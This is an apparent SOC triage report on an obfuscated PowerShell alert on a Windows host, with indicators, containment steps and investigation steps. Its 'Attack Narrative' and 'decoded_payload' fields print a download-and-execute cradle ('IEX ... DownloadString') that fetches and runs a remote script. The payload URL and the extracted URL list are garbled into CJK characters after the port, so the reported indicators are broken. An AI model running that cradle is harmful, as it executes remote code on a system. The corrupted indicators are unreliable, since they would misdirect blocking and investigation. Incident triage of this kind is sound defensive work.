# SOC Incident Triage Report: SEC-ALERT-2026-002

**Timestamp:** 2026-10-10T07:42:01Z  
**Host:** `vm-windows-target` | **User:** `azureuser`  
**Verdict:** **True Positive (High Fidelity)** | **Severity:** `9/10`  

## 1. Attack Narrative
Adversary executed obfuscated PowerShell on host vm-windows-target using Base64 encoding. The decoded payload attempts to download and execute an unauthorized remote script: 'IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:〸㠀　⼀猀攀挀爀攀琀⸀瀀猀㄀✀⤀'. This matches MITRE ATT&CK T1059.001.

## 2. Extracted Observables & IOCs
* **process_name:** `powershell.exe`
* **parent_process:** `explorer.exe`
* **decoded_payload:** `IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100:〸㠀　⼀猀攀挀爀攀琀⸀瀀猀㄀✀⤀`
* **registry_key:** `None`
* **extracted_urls:** `['http://192.168.1.100:〸㠀']`
* **extracted_ips:** `['192.168.1.100']`
* **target_file:** `None`

## 3. Recommended Containment Checklist
- [ ] Isolate endpoint 'vm-windows-target' from the network immediately.
- [ ] Terminate offending PowerShell process PID and block extracted IPs/URLs: ['http://192.168.1.100:〸㠀'].
- [ ] Revoke active session tokens for user 'azureuser' and initiate credential reset.

## 4. Next Investigation Steps
1. Review proxy and DNS logs for outbound beacons matching the extracted C2 IP/URL.
1. Check Sysmon Event ID 11 for files dropped into Temp or Downloads by explorer.exe.
1. Inspect parent process lineage to identify the initial access vector.
